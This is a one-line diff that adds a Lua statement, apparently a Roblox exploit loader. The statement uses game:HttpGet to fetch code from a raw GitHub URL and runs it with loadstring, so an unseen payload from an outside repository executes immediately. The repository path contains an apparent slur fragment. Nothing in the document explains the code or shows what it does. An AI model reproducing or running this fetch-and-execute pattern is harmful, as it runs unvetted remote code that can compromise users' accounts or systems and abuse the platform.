@@ -1,0 +1,1 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/nigpissmeoff/landoflizard-man/main/bigcomputerman")()
